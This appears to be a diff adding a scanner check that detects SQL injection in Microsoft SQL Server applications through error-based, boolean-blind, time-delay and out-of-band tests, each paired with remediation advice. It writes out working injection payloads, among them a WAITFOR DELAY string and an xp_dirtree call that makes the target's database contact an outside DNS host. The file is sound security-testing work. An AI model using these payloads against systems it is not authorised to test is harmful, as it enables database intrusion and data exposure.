@@ -1,0 +1,64 @@
+# Microsoft SQL Server SQL Injection Detection
+# Tests error-based, boolean-based, time-based, and OOB SQLi
+
+given insertion_point: "request"
+
+# Extract baseline response
+extract original_body from response.body
+extract original_status from response.status
+extract original_time from response.time
+
+# 1. Error-Based: Trigger MSSQL syntax error
+send request:
+  replace insertion_point with insertion_point + "'"
+if regex `unclosed quotation mark|syntax error near` in response.body then
+  report issue:
+    severity: high
+    confidence: certain
+    name: "MSSQL SQL Injection (Error-Based)"
+    detail: "MSSQL error detected with payload: {insertion_point + '''}. Response: {regex `unclosed quotation mark|syntax error near`}"
+    remediation: "Use parameterized queries or stored procedures."
+end if
+
+# 2. Boolean-Based Blind: Check response content change
+send request:
+  replace insertion_point with insertion_point + "' AND 1=1--"
+extract true_response from response.body
+
+send request:
+  replace insertion_point with insertion_point + "' AND 1=2--"
+extract false_response from response.body
+
+if true_response != false_response and true_response == original_body then
+  report issue:
+    severity: high
+    confidence: firm
+    name: "MSSQL SQL Injection (Boolean-Based Blind)"
+    detail: "Response changed between true (1=1) and false (1=2) conditions. True payload: {insertion_point + ''' AND 1=1--'}"
+    remediation: "Sanitize inputs and use parameterized queries."
+end if
+
+# 3. Time-Based Blind: Use WAITFOR DELAY
+send request:
+  replace insertion_point with insertion_point + "' WAITFOR DELAY '0:0:5'--"
+  set timeout to 10 seconds
+if response.time > original_time + 5000 then
+  report issue:
+    severity: high
+    confidence: tentative
+    name: "MSSQL SQL Injection (Time-Based Blind)"
+    detail: "Response delayed by {response.time - original_time}ms with payload: {insertion_point + ''' WAITFOR DELAY '0:0:5'--'}"
+    remediation: "Use prepared statements to prevent injection."
+end if
+
+# 4. Out-of-Band: DNS via xp_dirtree
+send request:
+  replace insertion_point with insertion_point + "'; EXEC xp_dirtree '\\test.' + collaborator_address + '\foo';--"
+if dns interactions then
+  report issue:
+    severity: high
+    confidence: certain
+    name: "MSSQL SQL Injection (Out-of-Band)"
+    detail: "DNS interaction detected via Collaborator with payload: {insertion_point + '''; EXEC xp_dirtree '\\test.' + collaborator_address + '\foo';--'}"
+    remediation: "Disable xp_dirtree and use parameterized queries."
+end if
